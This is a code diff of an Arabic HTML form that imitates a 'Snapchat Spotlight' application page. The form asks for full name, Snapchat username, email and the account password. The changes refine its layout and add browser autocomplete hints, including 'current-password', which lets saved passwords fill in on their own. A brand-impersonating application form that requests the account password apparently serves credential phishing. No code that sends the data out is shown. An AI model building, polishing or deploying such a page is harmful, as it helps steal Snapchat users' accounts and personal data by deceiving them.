@@ -1,144 +1,56 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="pageTitleForm">تقديم طلب الانضمام</title>
+    <title>تقديم طلب الانضمام</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
-    <style>
-        /* تنسيقات خاصة بصفحة النموذج */
-        .form-section {
-            background-color: #fcfcfc;
-            padding: 60px 20px;
-            min-height: 80vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .apply-form-container {
-            max-width: 500px;
-            width: 100%;
-            padding: 40px;
-            background: #fff;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            text-align: right;
-            position: relative; 
-        }
-        .apply-form-container h2 {
-            font-size: 2rem;
-            color: #1a1a1a;
-            margin-bottom: 30px;
-            text-align: center;
-        }
-        .form-group { margin-bottom: 20px; }
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-            color: #555;
-        }
-        .form-group input, .form-group textarea {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 1rem;
-            transition: border-color 0.3s;
-        }
-        .form-group input:focus, .form-group textarea:focus {
-            border-color: #FFFC00;
-            outline: none;
-            box-shadow: 0 0 5px rgba(255, 252, 0, 0.5);
-        }
-        .submit-btn {
-            background-color: #FFFC00;
-            color: #1a1a1a;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            width: 100%;
-            transition: background-color 0.3s;
-        }
-        .submit-btn:hover { background-color: #e6e400; }
-
-        /* تنسيقات شاشة التحميل Overlay */
-        .loading-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(255, 255, 255, 0.95);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 100;
-            border-radius: 15px;
-        }
-        .snap-loader {
-            width: 50px;
-            height: 50px;
-            background-color: #FFFC00;
-            border-radius: 50%;
-            animation: snapPulse 1.5s infinite ease-out;
-        }
-        .loader-text {
-            margin-top: 15px;
-            font-weight: bold;
-            color: #555;
-        }
-    </style>
 </head>
 <body>
+
     <header>
         <div class="container">
-            <img src="logo.png" alt="Snapchat Logo" class="logo">
+            <div class="logo">Snapchat Spotlight</div>
         </div>
     </header>
 
-    <section class="form-section">
-        <div class="apply-form-container">
+    <main class="container">
+        <div class="form-wrapper">
             <h2 id="formHeader">نموذج تقديم الطلب</h2>
             
-            <div class="loading-overlay" id="loadingOverlay">
-                <div class="snap-loader"></div>
-                <p class="loader-text" id="loaderText">جاري معالجة الطلب...</p>
-            </div>
-            
-            <form id="submissionForm" action="#" method="POST"> 
+            <form id="submissionForm">
                 
                 <div class="form-group">
                     <label for="fullName" id="labelName">الاسم بالكامل:</label>
-                    <input type="text" id="fullName" name="fullName" required>
+                    <input type="text" id="fullName" name="fullName" required autocomplete="name">
                 </div>
 
                 <div class="form-group">
                     <label for="snapchatHandle" id="labelSnapchat">معرّف حساب سناب شات:</label>
-                    <input type="text" id="snapchatHandle" name="snapchatHandle" required>
+                    <input type="text" id="snapchatHandle" name="snapchatHandle" required autocomplete="username">
                 </div>
 
                 <div class="form-group">
                     <label for="trackingEmail" id="labelTrackingField">البريد الإلكتروني:</label>
-                    <input type="email" id="trackingEmail" name="trackingEmail" required>
+                    <input type="email" id="trackingEmail" name="trackingEmail" required autocomplete="email">
                 </div>
-                
+
                 <div class="form-group">
                     <label for="passwordField" id="labelPassword">كلمة المرور:</label>
-                    <input type="password" id="passwordField" name="passwordField" required>
+                    <input type="password" id="passwordField" name="passwordField" required autocomplete="current-password">
                 </div>
-                
-                <div id="statusMessage" style="color: red; text-align: center; margin-bottom: 15px; display: none;"></div>
 
-                <button type="submit" class="submit-btn" id="submitBtn">إرسال الطلب</button>
+                <div id="statusMessage" class="status-message" style="display: none;"></div>
+
+                <button type="submit" id="submitBtn" class="btn-primary">إرسال الطلب</button>
             </form>
-        </div>
-    </section>
+            </div>
+    </main>
+
+    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
+        <div class="loader"></div>
+        <p id="loaderText">جاري معالجة الطلب...</p>
+    </div>
 
     <footer>
         <div class="container">
